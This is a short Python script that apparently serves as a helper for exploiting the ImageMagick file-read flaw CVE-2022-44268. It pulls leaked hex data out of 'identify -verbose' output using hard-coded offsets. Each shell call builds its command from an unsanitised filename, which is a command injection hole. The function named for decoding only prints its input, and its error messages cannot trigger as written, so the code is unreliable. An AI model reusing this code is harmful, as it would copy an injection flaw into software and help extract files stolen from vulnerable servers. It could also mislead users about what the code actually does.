import os, sys

def usage():
    print("[*] Usage: python3 magick2str.py [image file name | hex file name]")

def findHexHash(file):
    # store fileInfo into a string var
    fileInfo = str(os.popen("file " + str(file)).read())

    # run logic test checking for image files
    if ('png' in fileInfo.lower() or 'jpeg' in fileInfo.lower() or 'jpg' in fileInfo.lower()):
        magickImageMeta = str(os.popen("identify -verbose " + str(file)).read())

        # Extracting Hex String from previous os command
        hexHash = magickImageMeta[(1425-7):(len(magickImageMeta) - 278)]

        # extract file contents based from https://github.com/voidz0r/CVE-2022-44268
        displayHexDecode(hexHash)
    else:
        fileContents = str(os.popen("cat " + str(file)).read())
        displayHexDecode(fileContents)

def displayHexDecode(hexHash):
    try:
        print(hexHash) # raw bytes
    except Exception as e:
        print("[-] Error Within HexHash: Target File Doesn't Exist!")
        print("[-] Or Hex Code in File was Invalid!")

def main():
    totalArgs = len(sys.argv)

    if (totalArgs == 2):
        file = sys.argv[1]
        
        if (os.path.isfile(file)):
            findHexHash(file)
        else:
            print("[-] File Does Not Exist!")
    else:
        usage()
    
if __name__ == "__main__":
    main()